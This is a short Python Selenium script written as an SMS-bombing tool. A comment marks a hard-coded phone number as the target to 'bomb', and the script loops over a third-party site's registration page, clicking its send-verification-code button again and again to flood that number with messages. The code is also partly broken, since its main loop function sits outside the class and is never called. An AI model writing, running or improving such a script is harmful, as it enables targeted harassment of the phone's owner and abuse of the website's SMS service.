from selenium import webdriver
import time
import random
# 需要查看网页源代码定位到xml中具体填的是哪一个

class HongZha(object):
    def __init__(self):
        self.phone = ["15002924728"] # 你要轰炸的电话号码
        self.num = 0

    def send_yzm(self, button, name):
        button.click()
        self.num += 1
        print("{}  第{}次  发送成功  {}".format(self.phone, self.num, name))
        time.sleep(1000)
       

def tongren(self,name):
    while True:
        driver = webdriver.Chrome("C:\Program Files (x86)\Google\Chrome\Application\chromedriver.exe")
        driver.get("https://tn.gaywb.com/member.php?mod=register")
        tel = driver.find_element_by_xpath("//input[@id='mobile']")
        actual=random.choice(self.phone)
        tel.send_keys(actual)
        time.sleep(6)
        button = driver.find_element_by_xpath(
            "//div[@class='phoneSend_2']")
        button.click()
        time.sleep(600)
        self.send_yzm(button, name)
        driver.quit()
        print("---------"+actual)